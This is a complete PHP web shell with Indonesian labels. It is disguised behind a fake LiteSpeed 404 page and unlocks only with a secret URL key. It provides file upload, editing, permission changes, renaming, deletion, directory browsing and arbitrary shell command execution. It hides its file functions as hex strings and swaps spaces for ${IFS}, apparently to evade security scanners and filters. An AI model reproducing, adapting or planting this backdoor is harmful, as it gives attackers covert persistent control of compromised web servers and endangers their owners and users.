<?php
$access_key = 'coak';
if (!isset($_GET['ke']) || $_GET['ke'] !== $access_key) {
    header("HTTP/1.0 404 Not Found");
    header("Content-Type: text/html; charset=UTF-8");
    header("Server: LiteSpeed");

    echo <<<EOD
<!DOCTYPE html>
<html>
<head>
<title>404 Not Found</title>
<style>
body {
    margin: 0;
    font-family: Tahoma, Arial, sans-serif;
    background-color: #ffffff;
    color: #000000;
}
.container {
    text-align: center;
    margin-top: 100px;
}
h1 {
    font-size: 40px;
    color: #990000;
}
h3 {
    font-size: 20px;
    margin-top: 20px;
}
hr {
    margin: 30px auto;
    width: 50%;
    border: 0;
    border-top: 1px solid #ccc;
}
</style>
</head>
<body>
<div class="container">
    <h1>404 Not Found</h1>
    <hr>
    <h3>The resource requested could not be found on this server!</h3>
    <p>Powered By LiteSpeed Web Server</p>
</div>
</body>
</html>
EOD;
    exit;
}

header('X-Robots-Tag: noindex, nofollow', true);

$h = $_SERVER['HOME'] ?? '/';
$p = isset($_GET['p']) ? realpath($_GET['p']) : getcwd();
if (!$p || !is_dir($p)) $p = getcwd();

$uOK = false;
$fLink = '';
$edit = '';
$editTarget = '';
$cmdOutput = '';

function e($s) { return htmlspecialchars($s, ENT_QUOTES); }

$mv = hex2bin("6d6f76655f75706c6f616465645f66696c65");
$put = hex2bin("66696c655f7075745f636f6e74656e7473");
$chmodf = hex2bin("63686d6f64");
$renamef = hex2bin("72656e616d65");
$unlinkf = hex2bin("756e6c696e6b");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['up'])) {
        $dest = $p . '/' . basename($_FILES['up']['name']);
        if ($mv($_FILES['up']['tmp_name'], $dest)) {
            $uOK = true;
            $fLink = basename($dest);
        }
    } elseif (isset($_POST['chmod'], $_POST['file'])) {
        $chmodf($p . '/' . $_POST['file'], intval($_POST['chmod'], 8));
    } elseif (isset($_POST['save'], $_POST['file'])) {
        $put($p . '/' . $_POST['file'], $_POST['save']);
    } elseif (isset($_POST['rename'], $_POST['old'])) {
        $renamef($p . '/' . $_POST['old'], $p . '/' . $_POST['rename']);
    } elseif (isset($_POST['cmd'])) {
        $cmd = str_replace(' ', '${IFS}', $_POST['cmd']);
        $cmdOutput = shell_exec($cmd . ' 2>&1');
    }
}

if (isset($_GET['e'])) {
    $editTarget = basename($_GET['e']);
    $fullEdit = $p . '/' . $editTarget;
    if (is_file($fullEdit)) {
        $edit = htmlspecialchars(file_get_contents($fullEdit));
    }
}

if (isset($_GET['d'])) {
    $t = $p . '/' . basename($_GET['d']);
    if (is_file($t)) {
        $unlinkf($t);
        header("Location: ?p=" . urlencode($p) . "&neo=" . $access_key);
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>📁</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body { background: #101010; color: #ccc; font-family: monospace; padding: 20px; }
        a { color: #8cf; text-decoration: none; }
        table { width: 100%; margin-top: 10px; background: #181818; border-collapse: collapse; }
        th, td { padding: 6px; border: 1px solid #333; }
        th { background: #222; }
        input, button, textarea {
            background: #1c1c1c; color: #eee; border: 1px solid #444; padding: 5px;
        }
        .note { color: #666; font-size: 0.9em; margin-top: 10px; }
        pre {
            background: #000; color: #0f0; padding: 10px; border: 1px solid #333; overflow-x: auto;
        }
    </style>
    <?php if ($uOK): ?>
    <script>alert("✅ Upload sukses!");</script>
    <?php endif; ?>
</head>
<body>

<h3>📁 Dir: <?= e($p) ?></h3>
<form method="get">
    <input type="hidden" name="neo" value="<?= e($access_key) ?>">
    <input type="text" name="p" value="<?= e($p) ?>" style="width:60%;">
    <button>🔁 Go</button>
</form>

<hr>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="up">
    <button>📤 Upload</button>
</form>
<?php if ($fLink): ?>
<p><b>Link:</b> <a href="<?= e($fLink) ?>" target="_blank"><?= e($fLink) ?></a></p>
<?php endif; ?>

<?php if ($editTarget): ?>
<hr>
<form method="post">
    <input type="hidden" name="file" value="<?= e($editTarget) ?>">
    <textarea name="save" style="width:100%;height:300px;"><?= $edit ?></textarea><br>
    <button>💾 Save</button>
</form>
<?php endif; ?>

<hr>
<table>
<tr><th>Nama</th><th>Ukuran (kB)</th><th>Modif</th><th>CHMOD</th><th>Aksi</th></tr>
<?php
$items = scandir($p);
foreach ($items as $i) {
    if ($i === '.') continue;
    $fp = $p . '/' . $i;
    $isDir = is_dir($fp);
    $perm = substr(sprintf('%o', fileperms($fp)), -4);
    $size = $isDir ? '-' : round(filesize($fp)/1024, 2);
    $date = date("Y-m-d H:i:s", filemtime($fp));

    echo "<tr>";
    echo "<td>" . ($isDir ? "<a href='?p=" . urlencode($fp) . "&neo=$access_key'>📁 $i</a>" : "📄 $i") . "</td>";
    echo "<td>$size</td><td>$date</td><td>
        <form method='post' style='display:inline;'>
        <input type='hidden' name='file' value='" . e($i) . "'>
        <input type='text' name='chmod' value='$perm' size='4'>
        <button>Set</button>
        </form>
    </td>";
    echo "<td>";
    if (!$isDir) {
        echo "<a href='?p=" . urlencode($p) . "&e=" . urlencode($i) . "&neo=$access_key'>✏️</a> ";
        echo "<a href='?p=" . urlencode($p) . "&d=" . urlencode($i) . "&neo=$access_key' onclick='return confirm(\"Hapus?\")'>🗑️</a> ";
        echo "<a href='$i' download>⬇️</a> ";
        echo "<form method='post' style='display:inline;'>
                <input type='hidden' name='old' value='" . e($i) . "'>
                <input type='text' name='rename' value='" . e($i) . "' size='10'>
                <button>✏️</button>
              </form>";
    } else {
        echo "-";
    }
    echo "</td></tr>";
}
?>
</table>

<hr>
<form method="post">
    <input type="text" name="cmd" style="width:80%;" placeholder="misal: ls -la" required>
    <button>▶️</button>
</form>
<?php if ($cmdOutput): ?>
<pre><?= e($cmdOutput) ?></pre>
<?php endif; ?>

</body>
</html>
